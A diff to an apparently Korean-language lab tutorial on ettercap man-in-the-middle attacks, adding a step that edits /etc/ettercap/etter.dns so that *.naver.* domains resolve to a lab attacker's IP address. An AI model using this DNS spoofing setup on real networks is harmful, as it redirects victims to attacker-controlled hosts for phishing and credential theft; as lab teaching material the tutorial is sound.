@@ -6,6 +6,15 @@
 
 ![mtm](../imgs/mtm.png)
 
+### etter.dns 파일 수정
+
+```bash
+vim /etc/ettercap/etter.dns
+
+#etter.dns에 입력
+*.naver.* 192.168.44.145    # 공격자(kali#2-attacker) ip 주소입력
+```
+
 ### ettercap 실행
 
 ```bash
